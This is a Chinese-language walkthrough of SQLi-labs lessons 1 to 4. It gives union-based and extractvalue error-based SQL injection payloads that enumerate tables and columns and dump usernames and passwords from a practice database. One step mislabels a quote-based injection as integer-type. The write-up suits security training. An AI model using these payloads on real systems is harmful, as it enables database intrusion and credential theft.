sql labs Less1-4

Less1

手工注入：

1.判断是否存在注入漏洞
？id=1’

出现报错，说明可能存在漏洞注入

2.判断注入点类型
？id=1’ and 1=2–+

判断为整型注入

3.判断列数
?id=1’ order by 4–+

判断共有3列

4.判断数据显示位
?id=-1’ union select 1,2,3–+
使用-1使union前的语句查询无结果，显示union之后的第二条语句

显示位数为2,3

5.查询数据库名称
?id=-1’ union select 1,database(),database()–+
（只有2.3为显示位置，将2或3替换为database（））


6.查询数据库中所有表
?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+


7.查询user表中所有列
?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=”users”–+


8.查询用户数据
?id=-1’ union select 1,2,concat(id,0x3a,username,0x3a,password)from users–+ （0x3a为分隔符）
使用limit x,y查询特定用户数据，例如limit 1,3查询结果为id=2的用户数据
?id=-1’ union select 1,2,concat(id,0x3a,username,0x3a,password)from users limit 1,3–+

使用group_concat查询所有表中所有用户数据
?id=-1’ union select 1,2,group_concat(id,0x3a,username,0x3a,password)from users–+


报错注入：

与手工注入类似
extractvalue()和updatexml():对XML文档进行的查询语句
mysql版本需在5.1.5以上，长度限制为32位
1.通过报错注入查询数据库中的所有表
?id=1’ and (select extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e)))–+


2.查询用户表中的所有列
?id=1’ and (select extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=”users”),0x7e)))–+


3.查询用户数据
?id=1’ and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,password)from users),0x7e)))–+
(可能显示不全)

添加where条件，筛选特定用户数据
?id=1’ and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,password)from users where username not in(‘Dumb’)),0x7e)))–+
